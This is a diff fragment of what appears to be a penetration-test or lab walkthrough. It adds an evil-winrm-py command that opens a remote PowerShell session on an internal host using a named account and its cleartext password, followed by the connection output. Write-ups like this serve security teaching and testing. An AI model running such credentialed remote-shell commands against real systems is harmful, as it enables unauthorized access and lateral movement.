@@ -489,5 +489,15 @@ This user also has remote access here, and he is an admins group
 # Access to WINRM as `m.reeves` on the `WS-IT`
 
 ```python
+❯❯❯ evil-winrm-py -i ws-it.orion.local -u m.reeves -p 'Pa$$word!123'   
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
 
+[*] Connecting to 'ws-it.orion.local:5985' as 'm.reeves'
+evil-winrm-py PS C:\Users\m.reeves\Documents>
 ```
+
+Now ill log in 
